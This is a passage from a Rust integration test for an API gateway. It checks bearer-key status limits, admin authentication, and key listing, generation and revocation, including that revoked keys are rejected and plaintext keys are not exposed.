        no_auth.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Unauthorized" })
    );

    let st = client
        .get(format!("{base}/v1/status"))
        .bearer_auth(&key)
        .send()
        .await
        .unwrap();
    assert_eq!(st.status(), 200);
    let st_body: serde_json::Value = st.json().await.unwrap();
    assert_eq!(st_body["tier"], "free");
    assert_eq!(st_body["requests_today"], 1);
    assert_eq!(st_body["requests_limit"], 50);
    assert_eq!(st_body["tokens_today"], 18);
    assert_eq!(st_body["rate_per_minute"], 10);
    assert_eq!(st_body["max_concurrent"], 1);

    // Admin: auth gate, list, generate, revoke, revoke-again.
    let no_admin = get(&client, &base, "/admin/keys").await;
    assert_eq!(no_admin.status(), 401);
    let wrong_admin = client
        .get(format!("{base}/admin/keys"))
        .header("X-Admin-Key", "wrong")
        .send()
        .await
        .unwrap();
    assert_eq!(wrong_admin.status(), 401);

    let keys = client
        .get(format!("{base}/admin/keys"))
        .header("X-Admin-Key", "admin-test")
        .send()
        .await
        .unwrap();
    assert_eq!(keys.status(), 200);
    let keys_body: serde_json::Value = keys.json().await.unwrap();
    let rows = keys_body["keys"].as_array().expect("keys list");
    assert!(
        rows.iter()
            .any(|k| k["tier"] == "free" && k["label"] == "e2e-label"),
        "generated key must be listed: {}",
        serde_json::to_string(rows).unwrap_or_default()
    );
    assert!(
        rows.iter()
            .all(|k| !k.as_object().unwrap().contains_key("api_key")),
        "listings must not expose plaintext keys"
    );

    let gen = client
        .post(format!("{base}/admin/keys/generate"))
        .header("X-Admin-Key", "admin-test")
        .json(&serde_json::json!({ "tier": "unlimited", "label": "boss" }))
        .send()
        .await
        .unwrap();
    assert_eq!(gen.status(), 200);
    let gen_body: serde_json::Value = gen.json().await.unwrap();
    assert!(gen_body["api_key"]
        .as_str()
        .unwrap_or("")
        .starts_with("apex_"));
    assert_eq!(gen_body["tier"], "unlimited");
    assert_eq!(gen_body["label"], "boss");

    let revoke = client
        .post(format!("{base}/admin/keys/revoke"))
        .header("X-Admin-Key", "admin-test")
        .json(&serde_json::json!({ "api_key": key }))
        .send()
        .await
        .unwrap();
    assert_eq!(revoke.status(), 200);
    assert_eq!(
        revoke.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "status": "revoked" })
    );

    let revoke_again = client
        .post(format!("{base}/admin/keys/revoke"))
        .header("X-Admin-Key", "admin-test")
        .json(&serde_json::json!({ "api_key": key }))
        .send()
        .await
        .unwrap();
    // Python's `UPDATE ... WHERE api_key = ?` reports the row even when it
    // is already revoked: re-revoking a known key returns 200.
    assert_eq!(revoke_again.status(), 200);
    assert_eq!(
        revoke_again.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "status": "revoked" })
    );

    let unknown = client
        .post(format!("{base}/admin/keys/revoke"))
        .header("X-Admin-Key", "admin-test")
        .json(&serde_json::json!({ "api_key": "apex_unknown" }))
        .send()
        .await
        .unwrap();
    assert_eq!(unknown.status(), 404);
    assert_eq!(
        unknown.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Key not found" })
    );

    // The revoked key is rejected by a running server (re-read-on-access).
    let revoked_chat = client
        .post(format!("{base}/v1/chat/completions"))
        .bearer_auth(&key)
        .json(&chat_body)
        .send()
        .await
        .unwrap();
    assert_eq!(revoked_chat.status(), 401);
    assert_eq!(
        revoked_chat.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Invalid or revoked API key" })
    );

    // CLI sees the revoke and the two extra keys.
    let after = sb.run(&["gateway", "status"]);
    assert_success(&after, "gateway status (after revoke)");
    let after_text = stdout(&after);
    assert!(
        after_text.contains("Gateway keys (3):")
            && after_text.contains("[free]")
            && after_text.contains("(revoked)")
            && after_text.contains("[pro]")
            && after_text.contains("[unlimited]"),
        "got:\n{after_text}"
    );

    drop(_gw);
    let _ = upstream.join();
}
